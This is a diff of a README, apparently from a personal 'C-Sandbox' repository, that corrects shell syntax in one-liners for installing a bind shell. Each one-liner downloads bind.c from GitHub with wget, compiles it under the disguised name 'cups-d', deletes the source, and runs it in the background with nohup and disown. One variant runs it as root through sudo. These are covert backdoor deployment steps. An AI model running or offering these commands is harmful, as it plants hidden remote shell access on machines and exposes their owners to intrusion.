@@ -10,11 +10,11 @@ sudo apt-get install --yes wget gcc binutils || sudo yum -y install wget gcc bit
 ```
 ### RUN(current user):
 ```console
-wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
+wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d; rm -f ./bind.c 2>/dev/null; nohup ./cups-d & && disown 2>/dev/null
 ```
 ### RUN(via sudo):
 ```console
-wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
+wget -O bind.c https://github.com/ScorpionInc/C-Sandbox/raw/main/CBindShell/bind.c && gcc ./bind.c -o ./cups-d; rm -f ./bind.c 2>/dev/null; sudo nohup sudo ./cups-d & && disown 2>/dev/null
 ```
 
 ## BIND / Curl / GCC
